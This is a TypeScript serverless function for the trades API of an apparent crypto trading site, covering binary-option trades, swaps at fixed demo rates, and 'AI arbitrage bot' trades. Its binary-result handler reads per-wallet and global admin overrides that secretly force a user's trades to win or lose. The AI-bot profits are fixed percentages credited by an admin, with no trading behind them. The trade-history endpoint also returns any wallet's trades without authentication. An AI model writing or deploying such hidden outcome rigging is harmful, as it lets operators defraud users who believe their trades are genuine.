import { getStore } from "@netlify/blobs";
import type { Config, Context } from "@netlify/functions";
import { secureJson, sanitizeString, getClientIp, validateAdminSession, auditLog, persistAuditLog } from "../lib/security.js";
import { loadUsdtBalance, normalizeWallet, parseJsonObject, toArray, toNumber } from "../lib/validation.js";
import { randomInt } from "crypto";

const NETWORK_LATENCY_BUFFER_MS = 3000; // tolerated timer drift for network round-trip

const DEMO_RATES: Record<string, number> = {
  USDT: 1, USDC: 1, ETH: 3200, BTC: 65000, BNB: 600, SOL: 145,
  XRP: 0.58, ADA: 0.45, AVAX: 35, DOGE: 0.15,
};

type TradeOutcomeMode = "random" | "win" | "lose";

type TradeStatus = "active" | "won" | "lost" | "completed";

type StoredTrade = {
  id: number;
  type: string;
  status: TradeStatus | string;
  createdAt: string;
  direction?: string;
  levelId?: string | number;
  levelName?: string;
  capital?: string | number;
  tradingTime?: string | number;
  profitPercent?: string | number;
  dailyProfit?: string | number;
  cycleTime?: string | number;
  duration?: string | number;
  fromCoin?: string;
  toCoin?: string;
  amount?: string | number;
  estimatedOut?: string;
  fee?: string;
  profit?: number;
};

type TradeControlRecord = {
  outcome: TradeOutcomeMode;
};

function loadTradeList(value: unknown): StoredTrade[] {
  return toArray<StoredTrade>(value);
}

function getOutcomeMode(value: unknown): TradeOutcomeMode {
  return value === "win" || value === "lose" || value === "random" ? value : "random";
}

async function getTrades(store: ReturnType<typeof getStore>, wallet: string): Promise<StoredTrade[]> {
  const stored = await store.get(`trades-${wallet}`, { type: "json" });
  return loadTradeList(stored);
}

export default async (req: Request, context: Context) => {
  const store = getStore({ name: "app-data", consistency: "strong" });
  const ip = getClientIp(context);

  if (req.method === "GET") {
    const url = new URL(req.url);
    const wallet = normalizeWallet(String(url.searchParams.get("wallet") ?? ""));
    if (!wallet) {
      return secureJson({ error: "Wallet address required" }, 400);
    }
    const trades = await getTrades(store, wallet);
    return secureJson(trades, 200, true);
  }

  if (req.method === "POST") {
    let body: Record<string, unknown>;
    try {
      body = await parseJsonObject(req);
    } catch {
      return secureJson({ error: "Invalid JSON body" }, 400);
    }
    const type = String(body.type ?? "");
    const wallet = body.wallet;

    if (!wallet) {
      return secureJson({ error: "Wallet address required" }, 400);
    }

    const safeWallet = normalizeWallet(String(wallet));
    if (!safeWallet) {
      return secureJson({ error: "Invalid wallet address" }, 400);
    }

    // ── Handle binary trade result ────────────────────────────────────────────
    // Outcome is calculated server-side; the client only signals that the timer
    // has expired by sending the tradeId. Client-supplied profit is ignored.
    if (type === "binary-result") {
      const tradeId = body.tradeId;
      if (!tradeId) {
        return secureJson({ error: "Trade ID required" }, 400);
      }

      const trades = await getTrades(store, safeWallet);
      const tradeIdx = trades.findIndex((trade) => trade.id === Number(tradeId));

      if (tradeIdx === -1) {
        return secureJson({ error: "Trade not found" }, 404);
      }

      const trade = trades[tradeIdx];
      if (trade.type !== "binary" || trade.status !== "active") {
        return secureJson({ error: "Trade is not an active binary trade" }, 400);
      }

      // Verify trading time has elapsed (trade.id is a Unix-ms timestamp)
      const tradeAgeMs = Date.now() - Number(trade.id);
      const requiredMs = (Number(trade.tradingTime) || 60) * 1000;
      if (tradeAgeMs < requiredMs - NETWORK_LATENCY_BUFFER_MS) {
        return secureJson({ error: "Trading time has not elapsed yet" }, 400);
      }

      // Read per-wallet and global outcome overrides set by admin; per-wallet takes priority.
      // House edge: 52 out of 100 possible outcomes are losses (48% win rate).
      const perUserCtrl = (await store.get(`trade-control-${safeWallet}`, { type: "json" })) as TradeControlRecord | null;
      const globalCtrl  = (await store.get("trade-control-__GLOBAL__",    { type: "json" })) as TradeControlRecord | null;
      const outcomeMode = (perUserCtrl?.outcome && perUserCtrl.outcome !== "random") ? perUserCtrl.outcome
                        : (globalCtrl?.outcome   && globalCtrl.outcome   !== "random") ? globalCtrl.outcome
                        : getOutcomeMode("random");
      const win = outcomeMode === "win" ? true : outcomeMode === "lose" ? false : randomInt(0, 100) < 48;
      const capital = Math.max(0, toNumber(trade.capital, 0));
      const profitPct = Math.min(99, Math.max(0, toNumber(trade.profitPercent, 85)));
      // Capital was already deducted at trade creation; on win add capital+profit, on loss nothing more to deduct
      const profit = win
        ? parseFloat((capital + capital * profitPct / 100).toFixed(2))
        : 0;

      const balance = await loadUsdtBalance(store, safeWallet);
      balance.usdt = Math.max(0, balance.usdt + profit);
      await store.setJSON(`balance-${safeWallet}`, balance);

      trades[tradeIdx].status = win ? "won" : "lost";
      trades[tradeIdx].profit = profit;
      await store.setJSON(`trades-${safeWallet}`, trades);

      await persistAuditLog("BINARY_RESULT", {
        wallet: `${safeWallet.slice(0, 8)}…`,
        tradeId,
        won: win,
        profit,
        override: outcomeMode !== "random" ? outcomeMode : undefined,
        ip,
      }, store);

      return secureJson({ success: true, won: win, profit, newBalance: balance });
    }

    // ── Complete an AI arbitrage bot (admin-only) ─────────────────────────────
    if (type === "ai-bot-complete") {
      const sessionResult = await validateAdminSession(req, store);
      if (!sessionResult.valid) {
        auditLog("AUTH_FAILURE", { operation: "ai-bot-complete", reason: sessionResult.reason, ip });
        return secureJson({ error: "Unauthorized" }, 401);
      }

      const tradeId = body.tradeId;
      if (!tradeId) {
        return secureJson({ error: "Trade ID required" }, 400);
      }

      const trades = await getTrades(store, safeWallet);
      const tradeIdx = trades.findIndex((trade) => trade.id === Number(tradeId));

      if (tradeIdx === -1) {
        return secureJson({ error: "Trade not found" }, 404);
      }

      const trade = trades[tradeIdx];
      if (trade.type !== "ai-bot" || trade.status !== "active") {
        return secureJson({ error: "Trade is not an active AI bot trade" }, 400);
      }

      const capital = Math.max(0, toNumber(trade.capital, 0));
      // Support both new (profitPercent) and legacy (dailyProfit) field names
      const profitPct = Math.min(99, Math.max(0, toNumber(trade.profitPercent ?? trade.dailyProfit, 2.5)));
      const profit = parseFloat((capital * profitPct / 100).toFixed(2));

      const balance = await loadUsdtBalance(store, safeWallet);
      balance.usdt = Math.max(0, balance.usdt + profit);
      await store.setJSON(`balance-${safeWallet}`, balance);

      trades[tradeIdx].status = "completed";
      trades[tradeIdx].profit = profit;
      await store.setJSON(`trades-${safeWallet}`, trades);

      auditLog("ADMIN_WRITE", { operation: "ai-bot-complete", wallet: `${safeWallet.slice(0, 8)}…`, profit, ip });
      return secureJson({ success: true, profit, newBalance: balance });
    }

    // ── Record a new trade ────────────────────────────────────────────────────
    const trades = await getTrades(store, safeWallet);

    // For binary trades: validate and deduct capital before recording
    if (type === "binary") {
      const capital = Math.max(0, toNumber(body.capital, 0));
      if (capital <= 0) {
        return secureJson({ error: "Invalid capital amount" }, 400);
      }
      const balance = await loadUsdtBalance(store, safeWallet);
      if (balance.usdt < capital) {
        return secureJson({ error: "Insufficient balance" }, 400);
      }
      balance.usdt = Number((balance.usdt - capital).toFixed(2));
      await store.setJSON(`balance-${safeWallet}`, balance);
    }
    const newTrade: StoredTrade = {
      id: Date.now(),
      type: sanitizeString(String(type ?? ""), 32),
      status: "active",
      createdAt: new Date().toISOString(),
    };

    // Copy allowed fields (sanitized)
    const allowed = ["direction", "levelId", "levelName", "capital", "tradingTime",
      "profitPercent", "dailyProfit", "cycleTime", "duration", "fromCoin", "toCoin", "amount"] as const;
    const stringFields = new Set(["direction", "levelName", "fromCoin", "toCoin"]);
    for (const field of allowed) {
      if (body[field] !== undefined) {
        const value = body[field];
        if (stringFields.has(field) && typeof value === "string") {
          newTrade[field] = sanitizeString(value, 64);
        } else if (field === "levelId" || field === "capital" || field === "tradingTime" || field === "profitPercent" || field === "dailyProfit" || field === "cycleTime" || field === "duration" || field === "amount") {
          newTrade[field] = typeof value === "string" ? sanitizeString(value, 64) : toNumber(value, 0);
        }
      }
    }

    // Swap: calculate estimated output
    if (type === "swap") {
      const amount = Math.max(0, toNumber(body.amount, 0));
      const fromCoin = String(body.fromCoin ?? "");
      const toCoin = String(body.toCoin ?? "");
      const fromRate = DEMO_RATES[fromCoin] || 1;
      const toRate = DEMO_RATES[toCoin] || 1;
      const feeMultiplier = 0.995; // 0.5% fee
      newTrade.estimatedOut = ((amount * fromRate) / toRate * feeMultiplier).toFixed(6);
      newTrade.fee = (amount * 0.005).toFixed(6);
    }

    trades.unshift(newTrade);
    if (trades.length > 100) trades.length = 100;
    await store.setJSON(`trades-${safeWallet}`, trades);

    return secureJson(newTrade);
  }

  return new Response("Method not allowed", { status: 405 });
};

export const config: Config = {
  path: "/api/v2/trades",
  method: ["GET", "POST"],
};
